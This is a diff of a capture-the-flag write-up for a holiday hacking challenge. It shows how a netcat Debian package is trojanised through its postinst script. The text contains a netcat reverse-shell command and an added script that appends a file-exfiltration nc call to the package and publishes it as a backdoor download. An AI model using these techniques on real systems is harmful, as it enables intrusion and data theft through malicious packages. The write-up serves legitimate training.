@@ -34,13 +34,16 @@ This package was modified to include a netcat command in the postinst script to 
 By opting for 
 `/bin/nc 10.6.0.2 4444 -e /bin/bash`
 an interactive reverse shell can be acquired.
-```
 
-guest@faf32a4d4929:~/debs$ mkdir tmp
-guest@faf32a4d4929:~/debs$ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
-guest@faf32a4d4929:~/debs$ vi tmp/DEBIAN/postinst 
-guest@faf32a4d4929:~/debs$ dpkg-deb -b tmp suriv_amd64.deb
-dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.
+The snippet below automatically inserts the correct IP address of the local host and places the packag:
+```
+cd debs
+mkdir tmp
+dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
+echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
+mkdir -p ../pub/jfrost/backdoor
+dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
+
 ```
 
 and then made available in the web tree folder as `pub/jfrost/backdoor/suriv_amd64.deb`.
@@ -50,7 +53,7 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbODg1OTE4OTgxLDEyNzI2NTY0MTksODU4MT
+eyJoaXN0b3J5IjpbMjE1MzMzMDQ2LDEyNzI2NTY0MTksODU4MT
 g4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5
 OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMj
 A0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5
